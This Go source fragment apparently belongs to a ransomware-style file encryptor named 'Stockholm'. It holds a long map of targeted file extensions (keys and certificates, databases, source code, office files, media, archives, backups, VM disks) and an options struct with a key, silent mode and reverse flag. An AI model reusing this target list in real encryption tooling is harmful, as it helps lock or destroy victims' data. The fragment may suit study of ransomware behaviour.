package internal 

var TargetedExtensions = map[string]bool{
	".der": true, ".pfx": true, ".key": true, ".crt": true, ".csr": true, ".p12": true, ".pem": true, ".odt": true, ".ott": true, ".sxw": true, ".stw": true, ".uot": true, ".3ds": true, ".max": true, ".3dm": true, ".ods": true, ".ots": true, ".sxc": true, ".stc": true, ".dif": true, ".slk": true, ".wb2": true, ".odp": true, ".otp": true, ".sxd": true, ".std": true, 
	".uop": true, ".odg": true, ".otg": true, ".sxm": true, ".mml": true, ".lay": true, ".lay6": true, ".asc": true, ".sqlite3": true, ".sqlitedb": true, ".sql": true, ".accdb": true, ".mdb": true, ".db": true, ".dbf": true, ".odb": true, ".frm": true, ".myd": true, ".myi": true, ".ibd": true, ".mdf": true, ".ldf": true, ".sln": true, ".suo": true, ".cs": true, 
	".c": true, ".cpp": true, ".pas": true, ".h": true, ".asm": true, ".js": true, ".cmd": true, ".bat": true, ".ps1": true, ".vbs": true, ".vb": true, ".pl": true, ".dip": true, ".dch": true, ".sch": true, ".brd": true, ".jsp": true, ".php": true, ".asp": true, ".rb": true, ".java": true, ".jar": true, ".class": true, ".sh": true, ".mp3": true, ".wav": true, ".swf": true,
	".fla": true, ".wmv": true, ".mpg": true, ".vob": true, ".mpeg": true, ".asf": true, ".avi": true, ".mov": true, ".mp4": true, ".3gp": true, ".mkv": true, ".3g2": true, ".flv": true, ".wma": true, ".mid": true, ".m3u": true, ".m4u": true, ".djvu": true, ".svg": true, ".ai": true, ".psd": true, ".nef": true, ".tiff": true, ".tif": true, ".cgm": true, ".raw": true,
	".gif": true, ".png": true, ".bmp": true, ".jpg": true, ".jpeg": true, ".vcd": true, ".iso": true, ".backup": true, ".zip": true, ".rar": true, ".7z": true, ".gz": true, ".tgz": true, ".tar": true, ".bak": true, ".tbk": true, ".bz2": true, ".PAQ": true, ".ARC": true, ".aes": true, ".gpg": true, ".vmx": true, ".vmdk": true, ".vdi": true, ".sldm": true, ".sldx": true,
	".sti": true, ".sxi": true, ".602": true, ".hwp": true, ".snt": true, ".onetoc2": true, ".dwg": true, ".pdf": true, ".wk1": true, ".wks": true, ".123": true, ".rtf": true, ".csv": true, ".txt": true, ".vsdx": true, ".vsd": true, ".edb": true, ".eml": true, ".msg": true, ".ost": true, ".pst": true, ".potm": true, ".potx": true, ".ppam": true, ".ppsx": true,
	".ppsm": true, ".pps": true, ".pot": true, ".pptm": true, ".pptx": true, ".ppt": true, ".xltm": true, ".xltx": true, ".xlc": true, ".xlm": true, ".xlt": true, ".xlw": true, ".xlsb": true, ".xlsm": true, ".xlsx": true, ".xls": true, ".dotx": true, ".dotm": true, ".dot": true, ".docm": true, ".docb": true, ".docx": true, ".doc": true,
}

type StockholmOptions struct {
	Key []byte 
	Silent bool
	Reverse bool
}
